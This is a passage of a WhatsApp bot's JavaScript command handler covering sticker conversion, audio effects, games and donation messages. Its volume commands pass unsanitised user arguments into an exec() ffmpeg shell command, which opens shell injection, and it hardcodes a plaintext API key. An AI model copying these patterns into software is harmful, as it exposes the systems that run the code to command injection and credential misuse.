│  𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐧𝐝 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 𝐅𝐨𝐫: ${currentRuntime}  
│                                      
│  𝐎𝐰𝐧𝐞𝐫: ${ownername}           
│  𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: ${botname}         
╰━━━━━━━━━━━━━━━━━━━━━━━━╯`;

    ToxxicTechInc.sendMessage(m.chat, {
        text: pinga,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnailUrl: 'https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg',
                sourceUrl: wagc,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: fdoc
    });
    break;
case 'support': {
    // React to the incoming message with a card emoji
    ToxxicTechInc.sendMessage(from, { react: { text: "💳", key: m.key } });

    // Prepare the support message text with improved formatting
    let teks = `🌟 *𝐐𝐔𝐄𝐄𝐍 𝐑𝐈𝐀𝐒 𝐁𝐔𝐆 𝐄𝐃𝐈𝐓𝐈𝐎𝐍* 🌟
─────────────────────────────
❓ *𝐃𝐨 𝐲𝐨𝐮 𝐰𝐚𝐧𝐭 𝐭𝐡𝐢𝐬 𝐒𝐜𝐫𝐢𝐩𝐭?* 
*💡 𝐇𝐨𝐰 𝐭𝐨 𝐠𝐞𝐭 𝐭𝐡𝐢𝐬 𝐒𝐜𝐫𝐢𝐩𝐭:*
1. 𝐓𝐨 𝐆𝐞𝐭 𝐒𝐜𝐫𝐢𝐩𝐭: \`${prefix}repo\`

*📜 𝐇𝐨𝐰 𝐭𝐨 𝐒𝐡𝐨𝐰 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐭𝐨 𝐆𝐞𝐭 𝐅𝐫𝐞𝐞 𝐒𝐜𝐫𝐢𝐩𝐭𝐬:*
1. 𝐉𝐨𝐢𝐧 𝐌𝐲 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐂𝐡𝐚𝐧𝐧𝐞𝐥
2. 𝐃𝐨𝐧𝐚𝐭𝐞 𝐭𝐨 𝐌𝐲 𝐓𝐞𝐚𝐦 (𝐘𝐨𝐮 𝐰𝐢𝐥𝐥 𝐆𝐞𝐭 𝐕𝐈𝐏 𝐬𝐜)
3. 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐔𝐬 𝐰𝐢𝐭𝐡 𝐅𝐫𝐞𝐞 𝐂-𝐏𝐚𝐧𝐞𝐥 𝐅𝐨𝐫 𝐓𝐞𝐬𝐭𝐢𝐧𝐠 𝐁𝐨𝐭𝐬

🔒 *𝐀𝐥𝐥 𝐑𝐢𝐚𝐬 𝐑𝐞𝐥𝐚𝐭𝐞𝐝 𝐁𝐨𝐭s 𝐚𝐫𝐞 𝐚 𝐩𝐫𝐨𝐩𝐞𝐫𝐭𝐲 𝐨𝐟 𝐓𝐨𝐱𝐱𝐢𝐜 𝐓𝐞𝐜𝐡*
❗ *𝐃𝐨𝐧𝐭 𝐆𝐞𝐭 𝐒𝐜𝐚𝐦𝐦𝐞𝐝 𝐨𝐫 𝐝𝐞𝐜𝐞𝐢𝐯𝐞𝐝*
─────────────────────────────
💼 *𝐓𝐨𝐱𝐱𝐢𝐜 𝐓𝐞𝐜𝐡*
🔗 *𝐑𝐢𝐚𝐬 𝐆𝐫𝐞𝐦𝐨𝐫𝐲*
👑 *𝐑𝐢𝐚⃟𝐬 ⃟𝐂𝐨𝐫𝐞*`;

    // Send the formatted support message
    sendToxxicTechIncMessage(from, { 
        text: teks,
        mentions: [sender],
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true, 
            mentionedJid: [sender],
            "externalAdReply": {
                "showAdAttribution": true,
                "renderLargerThumbnail": true,
                "title": botname, 
                "containsAutoReply": true,
                "mediaType": 1, 
                "thumbnail": fs.readFileSync("./File/theme/rias.jpg"),
                "mediaUrl": `${wagc}`,
                "sourceUrl": `${wagc}`
            }
        }
    });
}
break;
case 'donate': {
    let teks = `Hi ${pushname}👋\nIf you enjoy using ${botname}, please consider supporting us by donating!\n\nYou can donate via:\n1. Bank Transfer: 2347042081220\nMomo PSB\nThank you for your support!`;
    await ToxxicTechInc.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: 'Support Us!',
                body: 'Help keep the bot running!',
                thumbnailUrl: 'https://i.ibb.co/yS8t5Gw/IMG-20240906-154744-545.jpg',
                sourceUrl: 'https://whatsapp.com/channel/0029Vao1R2n9sBIC9sPhvI1P',
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, {
        quoted: m
    });
}
break;
            case 'owner': {
            ToxxicTechInc.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
                ToxxicTechInc.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list
                    }, contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./File/theme/rias.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: fdoc
                })
            }
            break
            //convert
case 's': case 'sticker': case 'stiker': {
if (!quoted) return newReply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ToxxicTechInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return newReply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await ToxxicTechInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
newReply(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
if (!isPremium) return replyprem(mess.premium)
if (!args.join(" ")) return newReply(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
ToxxicTechInc.downloadAndSaveMediaMessage(quoted, "gifee")
ToxxicTechInc.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ToxxicTechInc.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return newReply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await ToxxicTechInc.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
newReply(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return newReply(`Reply sticker with caption *${prefix + command}*`)
                await hana()
                let media = await ToxxicTechInc.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return newReply(`Reply sticker with caption *${prefix + command}*`)
                await hana()
                let media = await ToxxicTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ToxxicTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await hana()
                let media = await ToxxicTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                ToxxicTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await hana()
                let media = await ToxxicTechInc.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                ToxxicTechInc.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `Queen Rias.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await hana()
                let media = await ToxxicTechInc.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                ToxxicTechInc.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return newReply(`Reply sticker with caption *${prefix + command}*`)
                await hana()
                let media = await ToxxicTechInc.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ToxxicTechInc.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                await hana()
                let media = await ToxxicTechInc.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    newReply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    newReply(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return newReply(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return newReply(`Example : ${prefix + command} 😅+🤔`)
                await hana()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await ToxxicTechInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return newReply(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await ToxxicTechInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return newReply(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                    ToxxicTechInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                    ToxxicTechInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                   ToxxicTechInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return newReply(`Example:\n${prefix}fliptext Queen Rias`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                newReply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return newReply(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await ToxxicTechInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return newReply(`Example: ${prefix + command} 10`)
media = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return newReply('Error!')
jadie = fs.readFileSync(rname)
ToxxicTechInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return newReply(`Example: ${prefix + command} 10`)
media = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return newReply('Error!')
jadie = fs.readFileSync(rname)
ToxxicTechInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await hana()
                let media = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return newReply(err)
                let buff = fs.readFileSync(ran)
                ToxxicTechInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else newReply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                newReply(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
newReply(teks)
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return newReply('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    newReply('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
                    let arr = room.game.render().map(v => {
                        return {
                            X: '❌',
                            O: '⭕',
                            1: '1️⃣',
                            2: '2️⃣',
                            3: '3️⃣',
                            4: '4️⃣',
                            5: '5️⃣',
                            6: '6️⃣',
                            7: '7️⃣',
                            8: '8️⃣',
                            9: '9️⃣',
                        } [v]
                    })
                    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
                    if (room.x !== room.o) await ToxxicTechInc.sendText(room.x, str, m, {
                        mentions: parseMention(str)
                    })
                    await ToxxicTechInc.sendText(room.o, str, m, {
                        mentions: parseMention(str)
                    })
                } else {
                    room = {
                        id: 'tictactoe-' + (+new Date),
                        x: m.chat,
                        o: '',
                        game: new TicTacToe(m.sender, 'o'),
                        state: 'WAITING'
                    }
                    if (text) room.name = text
                    newReply('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
                    this.game[room.id] = room
                }
            }
            break
            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        ToxxicTechInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        newReply(`Session TicTacToe🎮 tidak ada`)
                    } else newReply('?')
                } catch (e) {
                    newReply('Error')
                }
            }
            break
            case 'suitpvp':
            case 'suit': {
                this.suit = this.suit ? this.suit : {}
                let poin = 10
                let poin_lose = 10
                let timeout = 60000
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) newReply(`Finish your previous suit`)
                if (m.mentionedJid[0] === m.sender) return newReply(`Can't play with myself !`)
                if (!m.mentionedJid[0]) return newReply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
                    mentions: [owner[1] + '@s.whatsapp.net']
                })
                if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return newReply(`The person you are challenging is playing suit with someone else :(`)
                let id = 'suit_' + new Date() * 1
                let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

@${m.mentionedJid[0].split`@`[0]}Please type accept/reject, accept to accept or reject to reject the challenge`
                this.suit[id] = {
                    chat: await ToxxicTechInc.sendText(m.chat, caption, m, {
                        mentions: parseMention(caption)
                    }),
                    id: id,
                    p: m.sender,
                    p2: m.mentionedJid[0],
                    status: 'wait',
                    waktu: setTimeout(() => {
                        if (this.suit[id]) ToxxicTechInc.sendText(m.chat, `_Suit time is up_`, m)
                        delete this.suit[id]
                    }, 60000),
                    poin,
                    poin_lose,
                    timeout
                }
            }
            break
            case 'mathquiz': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) newReply(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./lib/math')
                if (!text) return newReply(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                ToxxicTechInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    newReply("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'afk': {
                let user = global.db.data.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                newReply(`${m.pushName} *Has Gone AFK*${text ? ': ' + text : ''}`)
            }
            break	
            case 'openai-indo': {
	            if (!q) return newReply(`Example : ${prefix + command} who is ronaldo`)
			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			      var isi = isiai.result
		         await newReply(isi)
			   }
			   break
    case 'ephemeral': {
                if (!m.isGroup) return LorenzoStickGroup()
                if (!isBotAdmins) return LorenzoStickBotAdmin()
                if (!isAdmins) return LorenzoStickAdmin()
                if (args[0] === 'on') {
                    await ToxxicTechInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await newReply(`Done`)
                } else if (args[0] === 'off') {
                    await ToxxicTechInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await newReply(`Done`)
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
            case 'delete': case 'del': case 'd':{
            	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 ToxxicTechInc.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!isCreator) return ownernya()
               
               if (args[0] === 'on') {
                  autoswview = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  autoswview = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'anticall': {
             if (!isCreator) return ownernya()
               
               if (args[0] === 'on') {
                  anticall = true
                  newReply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  anticall = false
                  newReply(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./File/theme/rias.jpg')}, { upload: ToxxicTechInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363336528578108@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
             break
case 'addvideo':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Whats the video name?')
if (VideoLorenzo.includes(q)) return newReply("The name is already in use")
let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
VideoLorenzo.push(q)
await fsx.copy(delb, `./File/video/${q}.mp4`)
fs.writeFileSync('./File/database/Lorenzovideo.json', JSON.stringify(VideoLorenzo))
fs.unlinkSync(delb)
newReply(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Enter the video name')
if (!VideoLorenzo.includes(q)) return newReply("The name does not exist in the database")
let wanu = VideoLorenzo.indexOf(q)
VideoLorenzo.splice(wanu, 1)
fs.writeFileSync('./File/database/Lorenzovideo.json', JSON.stringify(VideoLorenzo))
fs.unlinkSync(`./File/video/${q}.mp4`)
newReply(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoLorenzo) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoLorenzo.length}*`
newReply(teks)
}
break
case 'addimage':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Whats the image name?')
if (ImageLorenzo.includes(q)) return newReply("The name is already in use")
let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
ImageLorenzo.push(q)
await fsx.copy(delb, `./File/image/${q}.jpg`)
fs.writeFileSync('./File/database/Lorenzoimage.json', JSON.stringify(ImageLorenzo))
fs.unlinkSync(delb)
newReply(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Enter the image name')
if (!ImageLorenzo.includes(q)) return newReply("The name does not exist in the database")
let wanu = ImageLorenzo.indexOf(q)
ImageLorenzo.splice(wanu, 1)
fs.writeFileSync('./File/database/Lorenzoimage.json', JSON.stringify(ImageLorenzo))
fs.unlinkSync(`./File/image/${q}.jpg`)
newReply(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageLorenzo) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageLorenzo.length}*`
newReply(teks)
}
break
case 'addsticker':{
if (!isCreator) return ownernya()
if (args.length < 1) return newReply('Whats the sticker name?')
if (StickerLorenzo.includes(q)) return newReply("The name is already in use")
let delb = await ToxxicTechInc.downloadAndSaveMediaMessage(quoted)
StickerLorenzo.push(q)
await fsx.copy(delb, `./File/sticker/${q}.webp`)
